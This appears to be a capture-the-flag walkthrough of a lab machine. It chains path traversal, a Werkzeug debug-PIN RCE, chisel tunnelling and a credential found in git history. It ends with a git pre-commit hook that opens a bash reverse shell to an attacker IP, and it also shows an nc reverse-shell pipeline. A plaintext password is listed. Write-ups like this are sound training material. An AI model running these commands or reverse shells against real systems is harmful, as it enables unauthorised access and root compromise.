## Info

### Credential

| User  | Password                | Service | Note |
| ----- | ----------------------- | ------- | ---- |
| dev01 | Soulless_Developer#2022 |         |

## Path

### User

1. We can use `..%2F` to read arbitrary file on the box.

```bash
$ curl 'http://10.10.11.164/uploads/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F/etc/passwd'
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```

2. Since Flask is in debug mode, we could RCE from the debug console. But we need to find out the PIN first. I don't know why I cannot read `/proc/sys/kernel/random/boot_id`, `/proc/self/cgroup`, and `/sys/class/net/eth0/address` using Python or `curl`, so I use BurpSuite.

- [Method 1](https://ctftime.org/writeup/17955)
- [Method 2](https://www.daehee.com/werkzeug-console-pin-exploit/)
- MAC address can be get from `..//sys/class/net/eth0/address`

```python3
> ..//sys/class/net/eth0/address
02:42:ac:11:00:03

print(0x0242ac110003)
2485377892355
```

3. Use `exploit-pin.py` to generate the PIN and access the interactive debug console to RCE.

4. In the container, we can access the previously filtered port 3000 on host `172.17.0.1`, and it is a Gitea page. Use [`chisel`](https://github.com/jpillora/chisel) to do reverse port forwarding, so we can access the webpage easily.

```bash
# Forward 172.17.0.1:3000 to 127.0.0.1:7002
# own machine
$ ./chisel_1.7.7_linux_amd64 server --port 7001 --reverse

# on box
./chisel_1.7.7_linux_amd64 client http://10.10.17.233:7001 R:7002:172.17.0.1:3000
```

5. From the download source, we can found the developer's credential, and we can use it to log on to Gitea.

```bash
git diff  a76f8f75f7a4a12b706b0cf9c983796fa1985820
...
-{
-  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
-  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
-  "http.proxyStrictSSL": false
-}
```

6. From `dev01`'s repo, we can found its ssh private key, and use it to log on to the box.

### Root

1. Root seems to be doing something using `cron`.

```bash
     ├─cron -f
     │   └─cron -f
     │       └─sh -c /usr/local/bin/git-sync
     │           └─git-sync /usr/local/bin/git-sync
     │               └─git commit -m Backup for 2022-08-14
     │                   └─pre-commit .git/hooks/pre-commit
     │                       ├─cat /tmp/f
     │                       ├─nc 10.10.16.3 8199
     │                       └─sh -i
```

2. Since it runs pre-commit on `dev01`'s home, we can register a pre-commit than give us a root reverse shell.

```bash
# /home/dev01/.git/hooks/pre-commit
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

bash -c 'bash -i >& /dev/tcp/10.10.17.233/7001 0>&1'
```

```

```
